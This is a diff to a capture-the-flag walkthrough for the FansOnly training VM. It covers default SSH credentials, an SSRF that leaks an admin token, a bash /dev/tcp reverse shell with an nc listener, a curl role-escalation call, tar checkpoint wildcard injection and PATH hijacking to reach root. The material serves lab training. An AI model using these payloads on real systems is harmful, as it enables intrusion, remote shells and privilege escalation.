@@ -2,6 +2,8 @@
 
 Welcome to the **FansOnly** CTF. This document provides a complete "Red Team" walkthrough of the vulnerabilities discovered in the FansOnly storefront training environment.
 
+This guide only applies to the FansOnly training VM built from this repo. It is not a guide for attacking real systems. Assume the VM has been freshly reset with `sudo bash reset-state.sh` before you start.
+
 ---
 
 ## 🏗️ Scenario Overview
@@ -46,13 +48,27 @@ There are three primary ways into the system.
     - **Username**: `devops`
     - **Password**: `123456`
 3. **Exploit**: Use these to SSH into the box: `ssh devops@<vm_ip>`.
+4. **Important**: this opens the FansOnly restricted training shell, not a normal Linux shell.
+5. Useful starter commands inside the shell:
+   ```bash
+   whoami
+   pwd
+   ls
+   cat /etc/cron.d/fansonly-backup
+   cat /usr/local/sbin/fansonly-maintenance.sh
+   ```
 
 ### Path B: The Webhook Auditor (SSRF)
 1. Study the documentation at `/docs/webhook`. It mentions that "only loopback targets receive a live fetch."
 2. Open the tester at `/tools/webhook-test`.
-3. Enter the internal bootstrap URL: `http://127.0.0.1:9000/bootstrap`.
-4. **Result**: The response leaks an `adminToken`.
-5. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.
+3. The tester input is blank by default. The docs page lists decoy event types, but the key hint is still that only loopback targets receive a live fetch.
+4. Enter the internal bootstrap URL: `http://127.0.0.1:9000/bootstrap`.
+5. **Result**: The response leaks an `adminToken`.
+6. **Exploit**: Use this token to sign up for an analyst account at `/account/analyst-signup`.
+7. Example analyst account:
+   - **Email**: `analyst@fansonly.local`
+   - **Password**: `123456`
+8. After signup, copy the session token shown on `/account`. You will need it for the admin-promotion step.
 
 ### Path C: Legacy Action Preview (RCE)
 1. The homepage banner identifies the tech stack: `react@19.1.0` and `next@15.1.0`.
@@ -61,15 +77,12 @@ There are three primary ways into the system.
    ```bash
    nc -lvnp 4444
    ```
-4. Submit a reverse shell payload in the "Action payload" box. Replace `<LHOST>` with your Kali IP:
+4. Submit a reverse shell payload in the `Action payload` box. Replace `<LHOST>` with your Kali IP:
    ```bash
    bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"
    ```
-   *Note: In the simulation, you can also wrap this in the expected JSON format:*
-   ```json
-   {"mode":"preview","cmd":"bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'"}
-   ```
-5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`.
+   *Note:* the field currently executes the raw submitted command, so do not wrap the payload in JSON.
+5. **Result**: You should receive a connection back on your Kali listener, giving you a shell as `www-data`. Browser-interactive shell access at `/console` remains disabled, so the host-side execution must be observed through your listener.
 
 ---
 
@@ -77,14 +90,16 @@ There are three primary ways into the system.
 
 ### Horizontal: Analyst to Admin
 Once you have an analyst account and a session token (found on the `/account` page):
-1. Use a host-level context (like the `devops` SSH shell) to hit the internal Admin API.
-2. **Exploit**:
+1. On a freshly reset VM, the new analyst account is user ID `2`.
+2. Use a host-level context (like the `devops` SSH shell) to hit the internal Admin API.
+3. **Exploit**:
     ```bash
     curl -X POST http://127.0.0.1:4000/users/2/role \
       -H 'Authorization: Bearer <SESSION_TOKEN>' \
       -d '{"role":"admin"}'
     ```
-3. **Result**: Your account is promoted to **Admin**.
+4. **Result**: Your account is promoted to **Admin**.
+5. Refresh `/account` to verify that the role now reads `admin`.
 
 ### Vertical: Escalating to Root
 From the `devops` SSH shell, there are two ways to get root. 
@@ -98,6 +113,8 @@ The system runs a backup script using `tar *`.
 cd /srv/fan-backups/staging
 touch -- '--checkpoint=1'
 touch -- '--checkpoint-action=exec=sh shell.sh'
+whoami
+cat /root/root.txt
 ```
 When the cron job runs, it executes `shell.sh` as root.
 
@@ -106,6 +123,8 @@ The file `/usr/local/sbin/fansonly-maintenance.sh` uses relative paths for binar
 ```bash
 printf '#!/bin/sh\necho owned\n' > /home/devops/.local/bin/du
 chmod +x /home/devops/.local/bin/du
+id
+cat /root/root.txt
 ```
 Since `/home/devops/.local/bin` is first in the script's `PATH`, it executes your malicious `du` as root.
 
